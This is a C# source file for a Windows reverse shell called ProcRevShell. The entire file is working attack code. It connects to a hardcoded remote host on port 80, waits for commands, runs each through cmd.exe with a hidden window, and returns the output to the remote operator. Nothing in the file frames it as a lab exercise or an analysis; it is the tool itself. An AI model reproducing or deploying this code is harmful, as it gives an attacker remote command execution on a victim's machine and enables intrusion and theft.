using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace ProcRevShell
{
    public class Program
    {
        public static void Main(string[] args)
        {
            string serverIP = "10.1.1.92";
            int serverPort = 80;

            try
            {
                using (TcpClient tcpClient = new TcpClient(serverIP, serverPort))
                using (NetworkStream stream = tcpClient.GetStream())
                {
                    string connectionMessage = $"Hello there\n";
                    Byte[] sendBytes = Encoding.ASCII.GetBytes(connectionMessage);
                    stream.Write(sendBytes, 0, sendBytes.Length);

                    while (true)
                    {
                        Byte[] receiveBytes = new Byte[1024];
                        int bytesRead = stream.Read(receiveBytes, 0, receiveBytes.Length);
                        string returnData = Encoding.ASCII.GetString(receiveBytes, 0, bytesRead);

                        Console.WriteLine("Received command from " + serverIP);

                        string output = ExecuteCommand(returnData);

                        Byte[] outputBytes = Encoding.ASCII.GetBytes(output);
                        stream.Write(outputBytes, 0, outputBytes.Length);
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        static string ExecuteCommand(string command)
        {
            try
            {
                ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true
                };

                Process process = Process.Start(processInfo);
                process.WaitForExit();

                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                if (string.IsNullOrEmpty(output) && !string.IsNullOrEmpty(error))
                {
                    return error;
                }

                return output + error;
            }
            catch (Exception ex)
            {
                return "Error executing command: " + ex.Message;
            }
        }
    }
}
